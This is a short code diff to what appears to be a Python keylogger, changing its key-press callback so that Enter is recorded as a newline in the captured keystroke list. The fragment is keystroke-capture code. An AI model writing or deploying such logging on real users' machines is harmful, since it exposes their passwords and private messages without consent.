@@ -9,7 +9,12 @@ keystrokes = []
 def on_press(key):
     global keystrokes
     global counter
-    keystrokes.append(key)
+
+    #for formatting, if enter is pressed, will start a new line
+    if key == Key.enter:
+        keystrokes.append("\n")
+    else:
+        keystrokes.append(key)
 
     if counter == 10:
         counter = 0
